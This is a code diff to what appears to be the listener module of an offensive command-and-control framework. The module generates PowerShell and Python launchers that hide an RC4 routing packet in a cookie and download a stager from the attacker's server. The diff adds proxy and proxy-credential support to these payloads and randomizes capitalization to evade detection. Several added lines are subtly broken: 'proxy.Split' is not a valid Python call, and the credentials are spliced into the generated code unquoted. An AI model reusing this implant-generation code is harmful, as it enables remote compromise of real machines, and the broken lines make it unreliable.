@@ -172,7 +172,12 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
-                            pass
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            domain = username.split('\\')[0]
+                            usr = username.split('\\')[1]
+                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                 # TODO: reimplement stager retries?
 
@@ -242,8 +247,30 @@ class Listener:
                 # add the RC4 packet to a cookie
                 launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
                 launcherBase += "import urllib2\n"
-                launcherBase += "if urllib2.getproxies():\n"
-                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
+                
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                    else:
+                        proto = proxy.Split(':')[0]
+                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
+
+                    if proxyCreds != "none":
+                        if proxyCreds == "default":
+                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        else:
+                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
+                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                    else:
+                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                else:
+                    launcherBase += "o = urllib2.build_opener();\n"
+
+                #install proxy and creds globally, so they can be used with urlopen.
+                launcherBase += "urllib2.install_opener(o);\n"
                 
                 # download the stager and extract the IV
                 launcherBase += "a=o.open(server+t).read();"
